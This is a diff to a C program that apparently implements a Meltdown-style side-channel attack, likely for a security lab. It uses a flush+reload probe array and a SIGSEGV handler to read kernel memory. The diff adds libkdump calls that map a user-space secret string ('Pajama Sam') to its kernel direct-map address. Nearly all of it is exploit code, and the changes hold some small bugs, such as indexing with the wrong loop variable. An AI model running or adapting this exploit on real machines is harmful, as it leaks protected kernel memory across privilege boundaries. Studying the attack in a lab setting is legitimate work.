@@ -15,12 +15,16 @@
 #include <fcntl.h> // for open() the /proc file
 #include <unistd.h> // pread() /proc file
 
+#include "libkdump.h"
+
 #define PAGE_SIZE 4096
 #define PROBE_N 256
 #define CACHE_HIT_THRESHOLD 100
 #define DELTA 1024 // to reduce bias toward 0
 #define ITER_N 2000
-#define READ_N 200 // number of kernel bytes to read
+#define READ_N 10 // number of kernel bytes to read
+
+static char* secret = "Pajama Sam";
 
 // using the same technique from cache-time.c/flush-reload.c
 uint8_t probe_array[PROBE_N * PAGE_SIZE];
@@ -54,7 +58,30 @@ void probe() {
 
 int main(int argc, char* argv[]) {
 
-	unsigned long kernel_addr = 0xffff880088bcb070; // address of secret value in kernel space
+	libkdump_config_t config = config;
+	config = libkdump_get_autoconfig();
+	// edit config
+	config.physical_offset = 0xffff880000000000ull;
+
+	// initialize libkdump
+	if(libkdump_init(config) != 0) {
+		perror("Failed to initialize libkdump\n");
+		return -1;	
+	}
+
+	// read any virtual address, regardless of kernel/user space
+	size_t p_addr = libkdump_virt_to_phys( (size_t) &secret ); // convert to physical addr?	
+	//unsigned char val = libkdump_read(addr);
+	//printf("Read value: %02x\n", val);
+
+	// cleanup libkdump
+	if(libkdump_cleanup() != 0) {
+		perror("Failed to cleanup libkdump\n");
+		return -1;
+	}	
+	
+	unsigned long kernel_addr = config.physical_offset + p_addr; // address of secret value in kernel space
+	printf("VA: %p, PA: %p, Kernel addr: %p\n", &secret, p_addr, kernel_addr);	
 
 	// register signal handler for seg fault
 	signal(SIGSEGV, catch_segv);
@@ -88,7 +115,11 @@ int main(int argc, char* argv[]) {
 			}		
 			
 			// bring kernel data into the cache
-			int ret = pread(fd, NULL, 0, 0); // triggers the proc_read() function in kernel to be executed
+			//int ret = pread(fd, NULL, 0, 0); // triggers the proc_read() function in kernel to be executed
+			int s;
+			for(s=0; s<strlen(secret); s++) {
+				char c = secret[i];
+			}
 
 			// creates a checkpoint ; context is saved in sigjump_buf jbuf
 			if(sigsetjmp(jbuf, 1) == 0) {  // return 0 if checkpoint was set up ; returns non-zero if returning from siglongjump()
